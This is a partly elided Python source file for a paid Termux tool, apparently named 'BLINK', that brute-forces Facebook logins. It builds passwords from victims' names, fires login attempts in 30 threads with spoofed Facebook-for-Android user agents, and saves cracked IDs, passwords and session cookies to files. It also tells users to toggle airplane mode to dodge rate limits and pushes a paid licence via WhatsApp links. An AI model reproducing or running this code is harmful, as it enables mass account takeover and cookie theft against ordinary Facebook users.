# SOURCE BY : Victor Simpman
# GitHub : https://github.com/THE-LEGEND-VIICTOR
# Facebook : https://www.facebook.com/victorsimpman
from os import path
...
def p(x):
	print(x)
os.system(f'xdg-open https://chat.whatsapp.com/GSCQbSItjnhKo7WietpTh0')

logo=("""\033[1;37m  	

d8888b. db      d888888b d8b   db db   dD 
88  `8D 88        `88'   888o  88 88 ,8P' 
88oooY' 88         88    88V8o 88 88,8P   
88~~~b. 88         88    88 V8o88 88`8b   
88   8D 88booo.   .88.   88  V888 88 `88. 
Y8888P' Y88888P Y888888P VP   V8P YP   YD 

---------------------------------------------------
\033[1;37m [+] \033[1;37mARTHUR     :   VICTOR SIMPMAN
 [+] FACEBOOK  :   VICTOR BANTAWA RAI
 [+] GITHUB    :   THE-LEGEND-VIICTOR
 [+] TOOL      :   PAID
 [+] WHATSAPP :   +9779745258738 
 [+] VERSION   :  \033[1;32m 14.7\033[1;32m \033[1;37m
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                file = input('  Drop that file path in there\033[1;37m: ')
                                try:
                                        ...
                                        menu()
                                clear()
                                print(' Test out all them methods one by one ')
                                linex()
                                print(' [1] Method 1 \n [2] Method 2 \n [3] Method 3 \n [4] Method 4 ')
                                linex()
                                mthd=input(' Choose: ')
                                ...
                                if psx in ['1','01']:
                                        ...
                                        try:
                                                linex()
                                                ps_limit = int(input(' How many passwords you wanna add ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                ...
                                linex()
                                print(' You wanna show the CP account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m \x1b[38;5;208mREMEMBER TO SWITCH ON AIRPLANE MODE FOR EVEN MORE LIT IDS\033[1;37m")
                                        linex()
                                        for user in fo:
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/GSCQbSItjnhKo7WietpTh0/{wx}');menu()
                        elif xd in ['0','00']:
                                exit(' Thank you for using this tool ')
                        else:
...
def za():
    ...
    if myid in str(body):
        ...
        tp=0
        print("\33[1;37m Read note first dear \33[1;37m");print(logo);print (" Validity : 30Days 600");print (" validity : \33[1;37m15days= 400\n \033[1;32mFOR OUT OF COUNTRY-----------> \n \033[1;37mValidity : 30days = 10$\33[1;37m\n \33[1;37m\33[37;41mNote: If You Are Free User exit this tool\33[0;0m");linex();print(" Your Key  :\n "+myid);linex();print(' Suggest me a song then you will get the approval for free ');linex(); print(" I ACCEPT ALL COUNTRY'PAYMENT METHOD \nEXAMPLE JUST TEXT ME YOUR KEY IN MY INBOX AND ITS ALL FREE NO WORRIES \nWHO CARES BOUT WHERE YOU ARE FROM JUST SEND ME YOUR KEY");linex();print('FACEBOOK GO ON UPDATE THEN TOOL GIVE NOT OK RESULT  \nI WILL UPDATE MY TOOL EVERY TWO DAYS \nIF YOU CLEAR YOUR TERMUX DATA AND TOOL NEED AGAIN APPROVL  \nIDEVELPER ARE NOT RESPONSIBLE  ')
        ...
        os.system("xdg-open https://wa.me/+9779745258738")
def npxind():
                user=[]
                clear()
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as VICTOR:     
                        clear()
                        id = str(len(user))
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    VICTOR.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    VICTOR.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [VICTOR-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version}FBLC/pl_PL;FBRV/{fbbv};FBCR/{fbcr};FBMF/Xiaomi;FBBD/Redmi;FBPN/{fbpn};FBDV/Redmi220333QAG;FBSV/10;FBOP/arm64-v8a:arm;FBCA/"+"{"+f"density={density},width={width},height={height}]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [VICTOR-OK] '+ids+' | '+pas+'\033[1;97m')                 
                                       # print("\033[1;33m [BISCUT-🍪] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/VICTOR_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/VICTOR_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [VICTOR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/VICTOR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/VICTORbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [VICTOR-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [VICTOR-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        print("\033[1;96m [BISCUT-🍪] :\033[1;37m "+cookie)           
                                        open('/sdcard/VICTOR_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/VICTOR_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [VICTOR-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [VICTOR-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/VICTOR_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/VICTOR_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [VICTOR-M4] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
'Content-Length': '706'}
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [VICTOR-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/VICTOR_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/VICTOR_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                       
                                        oks.append(ids)              
                                        break                                                                         
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [VICTOR-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [VICTOR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/VICTOR_R_COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/VICTOR-R-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [VICTOR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VICTOR-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
'X-Fb-Server-Cluster': 'True',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [VICTOR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/VICTOR_R_COOKiE_M2.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/VICTOR-R-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
